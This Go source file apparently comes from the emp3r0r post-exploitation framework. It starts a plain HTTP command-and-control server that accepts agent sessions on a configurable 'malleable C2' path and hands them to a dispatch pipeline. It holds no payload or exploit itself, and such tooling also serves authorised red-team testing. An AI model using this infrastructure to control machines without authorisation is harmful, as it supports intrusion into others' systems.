package server

import (
	"fmt"
	"net/http"

	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// StartC2HTTPServer starts the plain HTTP transport server.
func StartC2HTTPServer() {
	if live.RuntimeConfig.CCHTTPPort == "" {
		logging.Errorf("StartC2HTTPServer: CCHTTPPort is not set in config")
		return
	}

	mux := http.NewServeMux()
	registerPreflightFeature(mux)

	c2Path := live.RuntimeConfig.MalleableC2.C2Path
	if c2Path == "" {
		c2Path = "/"
	}
	mux.HandleFunc(c2Path, func(w http.ResponseWriter, req *http.Request) {
		stream, err := transport.HandleHTTPServerSession(w, req, &live.RuntimeConfig.MalleableC2)
		if err == transport.ErrPollingRequest {
			// It was a polling internal multiplexing request, handled successfully
			return
		}
		if err != nil {
			logging.Errorf("C2 HTTP Server Accept error from %s: %v", req.RemoteAddr, err)
			return
		}
		if stream != nil {
			// New session established, start C2 dispatch pipeline
			logging.Debugf("C2 HTTP Server: new session started from %s", req.RemoteAddr)
			go cborStreamAccept(transport.NewStreamTransport(stream, req.RemoteAddr))
		}
	})

	server := &http.Server{
		Addr:    fmt.Sprintf(":%s", live.RuntimeConfig.CCHTTPPort),
		Handler: mux,
	}

	logging.Successf("🚀 Starting plain HTTP C2 server at port %s", live.RuntimeConfig.CCHTTPPort)
	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		logging.Fatalf("Failed to start plain HTTP C2 server at *:%s: %v", live.RuntimeConfig.CCHTTPPort, err)
	}
}
